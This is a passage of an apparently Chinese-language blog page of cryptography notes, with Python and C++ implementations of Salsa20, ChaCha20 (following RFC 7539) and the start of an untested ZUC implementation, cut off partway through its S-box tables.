class="keyword">def</span> <span class="title function_">_rotl32</span>(<span class="params">self, w, r</span>):</span><br><span class="line">        <span class="comment"># rotate left for 32-bits</span></span><br><span class="line">        <span class="keyword">return</span> (((w &lt;&lt; r) &amp; self._mask) | (w &gt;&gt; (<span class="number">32</span> - r)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    salsa20 = Salsa()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># vectors = [</span></span><br><span class="line">    <span class="comment">#    [ [0]*32, [3,1,4,1,5,9,2,6], [7,0,0,0,0,0,0,0],     # 这里就是参数!!!</span></span><br><span class="line">    <span class="comment">#    [ 0xb9a205a3,0x0695e150,0xaa94881a,0xadb7b12c,</span></span><br><span class="line">    <span class="comment">#      0x798942d4,0x26107016,0x64edb1a4,0x2d27173f,</span></span><br><span class="line">    <span class="comment">#      0xb1c7f1fa,0x62066edc,0xe035fa23,0xc4496f04,</span></span><br><span class="line">    <span class="comment">#      0x2131e6b3,0x810bde28,0xf62cb407,0x6bdede3d ] ] ]</span></span><br><span class="line">    vectors = [</span><br><span class="line">        [[<span class="number">0</span>] * <span class="number">32</span>, [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>], [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]]]  <span class="comment"># 这里就是参数!!!</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(vectors)):</span><br><span class="line">        v = vectors[i]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;key =&gt; <span class="subst">&#123;v[<span class="number">0</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;nonce =&gt; <span class="subst">&#123;v[<span class="number">1</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;block_counter =&gt; <span class="subst">&#123;v[<span class="number">2</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        s = salsa20(v[<span class="number">0</span>], v[<span class="number">1</span>], v[<span class="number">2</span>])</span><br><span class="line">        stream_key = []</span><br><span class="line">        <span class="comment"># for i in s:</span></span><br><span class="line">        <span class="comment">#   print(hex(i),end = &quot; &quot;)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">            stream_key.append(s[i] &amp; <span class="number">0xff</span>)</span><br><span class="line">            stream_key.append((s[i] &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span>)</span><br><span class="line">            stream_key.append((s[i] &amp; <span class="number">0xff0000</span>) &gt;&gt; <span class="number">16</span>)</span><br><span class="line">            stream_key.append((s[i] &amp; <span class="number">0xff000000</span>) &gt;&gt; <span class="number">24</span>)</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">        cybertext = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(stream_key)):</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(stream_key[i] ^ cybertext[i]), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="chacha20"><a class="markdownIt-Anchor" href="#chacha20">#</a> chacha20</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ChaCha20</span><br><span class="line">key = <span class="string">b&#x27;\x07\x05\x0B\x0D\x0F\x0D\x0B\x05\x07\x05\x1B\x1D\x1F\x1D\x1B\x05\x07\x05\x0B\x0D\x0F\x37\x35\x3B\x3D\x3F\x07\x05\x0B\x0D\x0F\x0D&#x27;</span></span><br><span class="line">plaintext = <span class="string">b&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_&quot;</span></span><br><span class="line">nonce = <span class="string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line">cipher = ChaCha20.new(key=key,nonce=nonce)</span><br><span class="line">ciphertext = cipher.encrypt(plaintext)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 nonce（用于解密）</span></span><br><span class="line"><span class="comment"># nonce = cipher.nonce</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line"><span class="comment"># cipher = ChaCha20.new(key=key, nonce=nonce)</span></span><br><span class="line"><span class="comment"># decrypted_text = cipher.decrypt(ciphertext)</span></span><br><span class="line"></span><br><span class="line">a = [<span class="built_in">hex</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> ciphertext]</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title">u32t8le</span><span class="params">(<span class="type">uint32_t</span> v, <span class="type">uint8_t</span> p[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">  p[<span class="number">0</span>] = v &amp; <span class="number">0xff</span>;</span><br><span class="line">  p[<span class="number">1</span>] = (v &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">  p[<span class="number">2</span>] = (v &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">  p[<span class="number">3</span>] = (v &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title">u8t32le</span><span class="params">(<span class="type">uint8_t</span> p[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">  <span class="type">uint32_t</span> value = p[<span class="number">3</span>];</span><br><span class="line">  </span><br><span class="line">  value = (value &lt;&lt; <span class="number">8</span>) | p[<span class="number">2</span>];</span><br><span class="line">  value = (value &lt;&lt; <span class="number">8</span>) | p[<span class="number">1</span>];</span><br><span class="line">  value = (value &lt;&lt; <span class="number">8</span>) | p[<span class="number">0</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title">rotl32</span><span class="params">(<span class="type">uint32_t</span> x, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// http://blog.regehr.org/archives/1063</span></span><br><span class="line">  <span class="keyword">return</span> x &lt;&lt; n | (x &gt;&gt; (-n &amp; <span class="number">31</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// https://tools.ietf.org/html/rfc7539##section-2.1</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">chacha20_quarterround</span><span class="params">(<span class="type">uint32_t</span> *x, <span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c, <span class="type">int</span> d)</span> </span>&#123;</span><br><span class="line">  x[a] += x[b]; x[d] = <span class="built_in">rotl32</span>(x[d] ^ x[a], <span class="number">16</span>);</span><br><span class="line">  x[c] += x[d]; x[b] = <span class="built_in">rotl32</span>(x[b] ^ x[c], <span class="number">12</span>);</span><br><span class="line">  x[a] += x[b]; x[d] = <span class="built_in">rotl32</span>(x[d] ^ x[a],  <span class="number">8</span>);</span><br><span class="line">  x[c] += x[d]; x[b] = <span class="built_in">rotl32</span>(x[b] ^ x[c],  <span class="number">7</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">chacha20_serialize</span><span class="params">(<span class="type">uint32_t</span> in[<span class="number">16</span>], <span class="type">uint8_t</span> output[<span class="number">64</span>])</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">u32t8le</span>(in[i], output + (i &lt;&lt; <span class="number">2</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">chacha20_block</span><span class="params">(<span class="type">uint32_t</span> in[<span class="number">16</span>], <span class="type">uint8_t</span> out[<span class="number">64</span>], <span class="type">int</span> num_rounds)</span> </span>&#123; <span class="comment">// num_rounds 一般为20 </span></span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">uint32_t</span> x[<span class="number">16</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">memcpy</span>(x, in, <span class="built_in">sizeof</span>(<span class="type">uint32_t</span>) * <span class="number">16</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (i = num_rounds; i &gt; <span class="number">0</span>; i -= <span class="number">2</span>) &#123;    </span><br><span class="line">    <span class="comment">//odd round</span></span><br><span class="line">    <span class="built_in">chacha20_quarterround</span>(x, <span class="number">0</span>, <span class="number">4</span>,  <span class="number">8</span>, <span class="number">12</span>);</span><br><span class="line">    <span class="built_in">chacha20_quarterround</span>(x, <span class="number">1</span>, <span class="number">5</span>,  <span class="number">9</span>, <span class="number">13</span>);</span><br><span class="line">    <span class="built_in">chacha20_quarterround</span>(x, <span class="number">2</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">14</span>);</span><br><span class="line">    <span class="built_in">chacha20_quarterround</span>(x, <span class="number">3</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">15</span>);</span><br><span class="line">    <span class="comment">//even round </span></span><br><span class="line">    <span class="built_in">chacha20_quarterround</span>(x, <span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">15</span>);</span><br><span class="line">    <span class="built_in">chacha20_quarterround</span>(x, <span class="number">1</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">12</span>);</span><br><span class="line">    <span class="built_in">chacha20_quarterround</span>(x, <span class="number">2</span>, <span class="number">7</span>,  <span class="number">8</span>, <span class="number">13</span>);</span><br><span class="line">    <span class="built_in">chacha20_quarterround</span>(x, <span class="number">3</span>, <span class="number">4</span>,  <span class="number">9</span>, <span class="number">14</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">    x[i] += in[i];</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">chacha20_serialize</span>(x, out);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// https://tools.ietf.org/html/rfc7539##section-2.3</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">chacha20_init_state</span><span class="params">(<span class="type">uint32_t</span> s[<span class="number">16</span>], <span class="type">uint8_t</span> key[<span class="number">32</span>], <span class="type">uint32_t</span> counter, <span class="type">uint8_t</span> nonce[<span class="number">12</span>])</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// refer: https://dxr.mozilla.org/mozilla-beta/source/security/nss/lib/freebl/chacha20.c</span></span><br><span class="line">  <span class="comment">// convert magic number to string: &quot;expand 32-byte k&quot;</span></span><br><span class="line">  s[<span class="number">0</span>] = <span class="number">0x61707865</span>;</span><br><span class="line">  s[<span class="number">1</span>] = <span class="number">0x3320646e</span>;</span><br><span class="line">  s[<span class="number">2</span>] = <span class="number">0x79622d32</span>;</span><br><span class="line">  s[<span class="number">3</span>] = <span class="number">0x6b206574</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">    s[<span class="number">4</span> + i] = <span class="built_in">u8t32le</span>(key + i * <span class="number">4</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  s[<span class="number">12</span>] = counter;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">    s[<span class="number">13</span> + i] = <span class="built_in">u8t32le</span>(nonce + i * <span class="number">4</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ChaCha20XOR</span><span class="params">(<span class="type">uint8_t</span> key[<span class="number">32</span>], <span class="type">uint32_t</span> counter, <span class="type">uint8_t</span> nonce[<span class="number">12</span>], <span class="type">uint8_t</span> *in, <span class="type">uint8_t</span> *out, <span class="type">int</span> inlen)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> i, j;</span><br><span class="line">  </span><br><span class="line">  <span class="type">uint32_t</span> s[<span class="number">16</span>];</span><br><span class="line">  <span class="type">uint8_t</span> block[<span class="number">64</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">chacha20_init_state</span>(s, key, counter, nonce);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; inlen; i += <span class="number">64</span>) &#123;</span><br><span class="line">    <span class="built_in">chacha20_block</span>(s, block, <span class="number">20</span>);</span><br><span class="line">    s[<span class="number">12</span>]++;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (j = i; j &lt; i + <span class="number">64</span>; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (j &gt;= inlen) &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      out[j] = in[j] ^ block[j - i];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  </span><br><span class="line">  <span class="type">uint8_t</span> key[] = &#123;</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>,</span><br><span class="line">    <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>,</span><br><span class="line">    <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0a</span>, <span class="number">0x0b</span>,</span><br><span class="line">    <span class="number">0x0c</span>, <span class="number">0x0d</span>, <span class="number">0x0e</span>, <span class="number">0x0f</span>,</span><br><span class="line">    <span class="number">0x10</span>, <span class="number">0x11</span>, <span class="number">0x12</span>, <span class="number">0x13</span>,</span><br><span class="line">    <span class="number">0x14</span>, <span class="number">0x15</span>, <span class="number">0x16</span>, <span class="number">0x17</span>,</span><br><span class="line">    <span class="number">0x18</span>, <span class="number">0x19</span>, <span class="number">0x1a</span>, <span class="number">0x1b</span>,</span><br><span class="line">    <span class="number">0x1c</span>, <span class="number">0x1d</span>, <span class="number">0x1e</span>, <span class="number">0x1f</span></span><br><span class="line">  &#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="type">uint8_t</span> nonce[] = &#123;                <span class="comment">// 随机数 </span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">  &#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="type">uint8_t</span> input[<span class="number">114</span>] = &#123;</span><br><span class="line">    <span class="number">0x4c</span>, <span class="number">0x61</span>, <span class="number">0x64</span>, <span class="number">0x69</span>, <span class="number">0x65</span>, <span class="number">0x73</span>, <span class="number">0x20</span>, <span class="number">0x61</span>, <span class="number">0x6e</span>, <span class="number">0x64</span>, <span class="number">0x20</span>, <span class="number">0x47</span>, <span class="number">0x65</span>, <span class="number">0x6e</span>, <span class="number">0x74</span>, <span class="number">0x6c</span></span><br><span class="line">  &#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="type">uint8_t</span> encrypt[<span class="number">114</span>];</span><br><span class="line">  <span class="type">uint8_t</span> decrypt[<span class="number">114</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="type">int</span> counter = <span class="number">1</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">ChaCha20XOR</span>(key, counter, nonce, input, encrypt, <span class="number">114</span>);             </span><br><span class="line">  <span class="built_in">ChaCha20XOR</span>(key, counter, nonce, encrypt, decrypt, <span class="number">114</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nkey:&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!(i % <span class="number">16</span>)) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, key[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\nnonce:\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">12</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, nonce[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\nplaintext:&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">114</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!(i % <span class="number">16</span>)) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, input[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\nencrypted:&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">114</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!(i % <span class="number">16</span>)) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, encrypt[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\ndecrypted:&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">114</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!(i % <span class="number">16</span>)) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, decrypt[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="zuc"><a class="markdownIt-Anchor" href="#zuc">#</a> ZUC</h4>
<p>未测试过，没找到合适的标准库</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> ceil</span><br><span class="line"> </span><br><span class="line">S0 = [</span><br><span class="line">    <span class="number">0x3E</span>, <span class="number">0x72</span>, <span class="number">0x5B</span>, <span class="number">0x47</span>, <span class="number">0xCA</span>, <span class="number">0xE0</span>, <span class="number">0x00</span>, <span class="number">0x33</span>, <span class="number">0x04</span>, <span class="number">0xD1</span>, <span class="number">0x54</span>, <span class="number">0x98</span>, <span class="number">0x09</span>, <span class="number">0xB9</span>, <span class="number">0x6D</span>, <span class="number">0xCB</span>,</span><br><span class="line">    <span class="number">0x7B</span>, <span class="number">0x1B</span>, <span class="number">0xF9</span>, <span class="number">0x32</span>, <span class="number">0xAF</span>, <span class="number">0x9D</span>, <span class="number">0x6A</span>, <span class="number">0xA5</span>, <span class="number">0xB8</span>, <span class="number">0x2D</span>, <span class="number">0xFC</span>, <span class="number">0x1D</span>, <span class="number">0x08</span>, <span class="number">0x53</span>, <span class="number">0x03</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x4D</span>, <span class="number">0x4E</span>, <span class="number">0x84</span>, <span class="number">0x99</span>, <span class="number">0xE4</span>, <span class="number">0xCE</span>, <span class="number">0xD9</span>, <span class="number">0x91</span>, <span class="number">0xDD</span>, <span class="number">0xB6</span>, <span class="number">0x85</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x29</span>, <span class="number">0x6E</span>, <span class="number">0xAC</span>,</span><br><span class="line">    <span class="number">0xCD</span>, <span class="number">0xC1</span>, <span class="number">0xF8</span>, <span class="number">0x1E</span>, <span class="number">0x73</span>, <span class="number">0x43</span>, <span class="number">0x69</span>, <span class="number">0xC6</span>, <span class="number">0xB5</span>, <span class="number">0xBD</span>, <span class="number">0xFD</span>, <span class="number">0x39</span>, <span class="number">0x63</span>, <span class="number">0x20</span>, <span class="number">0xD4</span>, <span class="number">0x38</span>,</span><br><span class="line">    <span class="number">0x76</span>, <span class="number">0x7D</span>, <span class="number">0xB2</span>, <span class="number">0xA7</span>, <span class="number">0xCF</span>, <span class="number">0xED</span>, <span class="number">0x57</span>, <span class="number">0xC5</span>, <span class="number">0xF3</span>, <span class="number">0x2C</span>, <span class="number">0xBB</span>, <span class="number">0x14</span>, <span class="number">0x21</span>, <span class="number">0x06</span>, <span class="number">0x55</span>, <span class="number">0x9B</span>,</span><br><span class="line">    <span class="number">0xE3</span>, <span class="number">0xEF</span>, <span class="number">0x5E</span>, <span class="number">0x31</span>, <span class="number">0x4F</span>, <span class="number">0x7F</span>, <span class="number">0x5A</span>, <span class="number">0xA4</span>, <span class="number">0x0D</span>, <span class="number">0x82</span>, <span class="number">0x51</span>, <span class="number">0x49</span>, <span class="number">0x5F</span>, <span class="number">0xBA</span>, <span class="number">0x58</span>, <span class="number">0x1C</span>,</span><br><span class="line">    <span class="number">0x4A</span>, <span class="number">0x16</span>, <span class="number">0xD5</span>, <span class="number">0x17</span>, <span class="number">0xA8</span>, <span class="number">0x92</span>, <span class="number">0x24</span>, <span class="number">0x1F</span>, <span class="number">0x8C</span>, <span class="number">0xFF</span>, <span class="number">0xD8</span>, <span class="number">0xAE</span>, <span class="number">0x2E</span>, <span class="number">0x01</span>, <span class="number">0xD3</span>, <span class="number">0xAD</span>,</span><br><span class="line">    <span class="number">0x3B</span>, <span class="number">0x4B</span>, <span class="number">0xDA</span>, <span class="number">0x46</span>, <span class="number">0xEB</span>, <span class="number">0xC9</span>, <span class="number">0xDE</span>, <span class="number">0x9A</span>, <span class="number">0x8F</span>, <span class="number">0x87</span>, <span class="number">0xD7</span>, <span class="number">0x3A</span>, <span class="number">0x80</span>, <span class="number">0x6F</span>, <span class="number">0x2F</span>, <span class="number">0xC8</span>,</span><br><span class="line">    <span class="number">0xB1</span>, <span class="number">0xB4</span>, <span class="number">0x37</span>, <span class="number">0xF7</span>, <span class="number">0x0A</span>, <span class="number">0x22</span>, <span class="number">0x13</span>, <span class="number">0x28</span>, <span class="number">0x7C</span>, <span class="number">0xCC</span>, <span class="number">0x3C</span>, <span class="number">0x89</span>, <span class="number">0xC7</span>, <span class="number">0xC3</span>, <span class="number">0x96</span>, <span class="number">0x56</span>,</span><br><span class="line">    <span class="number">0x07</span>, <span class="number">0xBF</span>, <span class="number">0x7E</span>, <span class="number">0xF0</span>, <span class="number">0x0B</span>, <span class="number">0x2B</span>, <span class="number">0x97</span>, <span class="number">0x52</span>, <span class="number">0x35</span>, <span class="number">0x41</span>, <span class="number">0x79</span>, <span class="number">0x61</span>, <span class="number">0xA6</span>, <span class="number">0x4C</span>, <span class="number">0x10</span>, <span class="number">0xFE</span>,</span><br><span class="line">    <span class="number">0xBC</span>, <span class="number">0x26</span>, <span class="number">0x95</span>, <span class="number">0x88</span>, <span class="number">0x8A</span>, <span class="number">0xB0</span>, <span class="number">0xA3</span>, <span class="number">0xFB</span>, <span class="number">0xC0</span>, <span class="number">0x18</span>, <span class="number">0x94</span>, <span class="number">0xF2</span>, <span class="number">0xE1</span>, <span class="number">0xE5</span>, <span class="number">0xE9</span>, <span class="number">0x5D</span>,</span><br><span class="line">    <span class="number">0xD0</span>, <span class="number">0xDC</span>, <span class="number">0x11</span>, <span class="number">0x66</span>, <span class="number">0x64</span>, <span class="number">0x5C</span>, <span class="number">0xEC</span>, <span class="number">0x59</span>, <span class="number">0x42</span>, <span class="number">0x75</span>, <span class="number">0x12</span>, <span class="number">0xF5</span>, <span class="number">0x74</span>, <span class="number">0x9C</span>, <span class="number">0xAA</span>, <span class="number">0x23</span>,</span><br><span class="line">    <span class="number">0x0E</span>, <span class="number">0x86</span>, <span class="number">0xAB</span>, <span class="number">0xBE</span>, <span class="number">0x2A</span>, <span class="number">0x02</span>, <span class="number">0xE7</span>, <span class="number">0x67</span>, <span class="number">0xE6</span>, <span class="number">0x44</span>, <span class="number">0xA2</span>, <span class="number">0x6C</span>, <span class="number">0xC2</span>, <span class="number">0x93</span>, <span class="number">0x9F</span>, <span class="number">0xF1</span>,</span><br><span class="line">    <span class="number">0xF6</span>, <span class="number">0xFA</span>, <span class="number">0x36</span>, <span class="number">0xD2</span>, <span class="number">0x50</span>, <span class="number">0x68</span>, <span class="number">0x9E</span>, <span class="number">0x62</span>, <span class="number">0x71</span>, <span class="number">0x15</span>, <span class="number">0x3D</span>, <span class="number">0xD6</span>, <span class="number">0x40</span>, <span class="number">0xC4</span>, <span class="number">0xE2</span>, <span class="number">0x0F</span>,</span><br><span class="line">    <span class="number">0x8E</span>, <span class="number">0x83</span>, <span class="number">0x77</span>, <span class="number">0x6B</span>, <span class="number">0x25</span>, <span class="number">0x05</span>, <span class="number">0x3F</span>, <span class="number">0x0C</span>, <span class="number">0x30</span>, <span class="number">0xEA</span>, <span class="number">0x70</span>, <span class="number">0xB7</span>, <span class="number">0xA1</span>, <span class="number">0xE8</span>, <span class="number">0xA9</span>, <span class="number">0x65</span>,</span><br><span class="line">    <span class="number">0x8D</span>, <span class="number">0x27</span>, <span class="number">0x1A</span>, <span class="number">0xDB</span>, <span class="number">0x81</span>, <span class="number">0xB3</span>, <span class="number">0xA0</span>, <span class="number">0xF4</span>, <span class="number">0x45</span>, <span class="number">0x7A</span>, <span class="number">0x19</span>, <span class="number">0xDF</span>, <span class="number">0xEE</span>, <span class="number">0x78</span>, <span class="number">0x34</span>, <span class="number">0x60</span></span><br><span class="line">]</span><br><span class="line"> </span><br><span class="line">S1 = [</span><br><span class="line">    <span class="number">0x55</span>, <span class="number">0xC2</span>, <span class="number">0x63</span>, <span class="number">0x71</span>, <span class="number">0x3B</span>, <span class="number">0xC8</span>, <span class="number">0x47</span>, <span class="number">0x86</span>, <span class="number">0x9F</span>, <span class="number">0x3C</span>, <span class="number">0xDA</span>, <span class="number">0x5B</span>, <span class="number">0x29</span>, <span class="number">0xAA</span>, <span class="number">0xFD</span>, <span class="number">0x77</span>,</span><br><span class="line">    <span class="number">0x8C</span>, <span class="number">0xC5</span>, <span class="number">0x94</span>, <span class="number">0x0C</span>, <span class="number">0xA6</span>, <span class="number">0x1A</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0xE3</span>, <span class="number">0xA8</span>, <span class="number">0x16</span>, <span class="number">0x72</span>, <span class="number">0x40</span>, <span class="number">0xF9</span>, <span class="number">0xF8</span>, <span class="number">0x42</span>,</span><br><span class="line">    <span class="number">0x44</span>, <span class="number">0x26</span>, <span class="number">0x68</span>, <span class="number">0x96</span>, <span class="number">0x81</span>, <span class="number">0xD9</span>, <span class="number">0x45</span>, <span class="number">0x3E</span>, <span class="number">0x10</span>, <span class="number">0x76</span>, <span class="number">0xC6</span>, <span class="number">0xA7</span>, <span class="number">0x8B</span>, <span class="number">0x39</span>, <span class="number">0x43</span>, <span class="number">0xE1</span>,</span><br><span class="line">    <span class="number">0x3A</span>, <span class="number">0xB5</span>, <span class="number">0x56</span>, <span class="number">0x2A</span>, <span class="number">0xC0</span>, <span class="number">0x6D</span>, <span class="number">0xB3</span>, <span 